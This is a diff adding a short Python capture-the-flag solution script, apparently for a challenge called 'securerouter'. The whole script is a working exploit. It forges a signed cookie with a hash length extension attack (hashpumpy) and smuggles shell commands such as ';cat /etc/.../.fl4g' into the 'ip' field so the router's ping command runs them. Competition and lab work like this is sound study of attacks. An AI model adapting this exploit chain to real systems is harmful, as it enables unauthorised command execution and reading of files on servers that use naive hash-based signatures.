@@ -1,0 +1,35 @@
+by GlacierSG
+
+```
+#/bin/python2
+
+import hashlib
+from hashpumpy import hashpump
+
+from binascii import unhexlify, hexlify 
+from urllib import quote
+import requests
+from base64 import b64decode as d, b64encode as e
+
+ip = '0.0.0.255'
+
+r = requests.post('https://securerouter.ctf.zone/?command=traceroute', data={'ip':ip})
+cookie = (r.cookies.get_dict())
+
+
+
+h = cookie['hash']
+
+origpayload = d(cookie['ip'])
+#exploit = ';find / -group www-data'
+exploit = ';cat /etc/.../.fl4g'
+x = 32
+
+payload = hashpump(h, origpayload, exploit, x)
+
+ip = e(payload[1])
+hsh = (payload[0])
+
+r = requests.get('https://securerouter.ctf.zone/?command=ping', cookies={'ip':ip, 'hash':hsh})
+print(r.content)
+```
